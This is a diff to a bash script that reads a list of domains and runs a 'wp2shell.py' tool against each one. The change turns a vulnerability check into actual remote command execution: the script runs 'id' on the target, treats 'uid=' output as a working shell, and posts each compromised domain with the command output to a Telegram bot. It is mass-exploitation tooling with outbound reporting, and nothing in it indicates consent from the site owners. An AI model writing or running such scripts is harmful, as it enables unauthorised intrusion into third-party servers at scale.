@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# batch-scan.sh — simple check + telegram
+# batch-scan.sh — test actual RCE shell with "id"
 
 TG_TOKEN="${TG_TOKEN:-}"
 TG_CHAT_ID="${TG_CHAT_ID:-}"
@@ -18,20 +18,23 @@ while IFS= read -r domain || [[ -n "$domain" ]]; do
   domain="${domain%"${domain##*[![:space:]]}"}"
   [[ -z "$domain" ]] && continue
 
-  result=$(python3 "$SCRIPT_DIR/wp2shell.py" check "https://$domain" 2>&1)
+  echo -n "$domain... "
 
-  if echo "$result" | grep -q "full RCE chain" && echo "$result" | grep -q "Route confusion ACTIVE"; then
-    echo "🔴 $domain"
-    echo "$domain" >> "$RESULTS_DIR/confirmed.txt"
+  result=$(python3 "$SCRIPT_DIR/wp2shell.py" shell "https://$domain" --cmd "id" 2>&1)
+
+  if echo "$result" | grep -q "uid="; then
+    echo "🔴 SHELL WORKS"
+    echo "$domain | $result" >> "$RESULTS_DIR/confirmed.txt"
     curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
       -d chat_id="$TG_CHAT_ID" \
-      -d text="🔴 RCE — $domain" > /dev/null 2>&1
+      -d text="🔴 SHELL — $domain
+$result" > /dev/null 2>&1
   else
-    echo "⚪ $domain"
+    echo "⚪ skip"
     echo "$domain" >> "$RESULTS_DIR/not-vuln.txt"
   fi
 done < "$1"
 
 echo ""
-echo "Confirmed: $(wc -l < "$RESULTS_DIR/confirmed.txt")"
-echo "Not vulnerable: $(wc -l < "$RESULTS_DIR/not-vuln.txt")"
+echo "Shell confirmed: $(wc -l < "$RESULTS_DIR/confirmed.txt")"
+echo "No shell: $(wc -l < "$RESULTS_DIR/not-vuln.txt")"
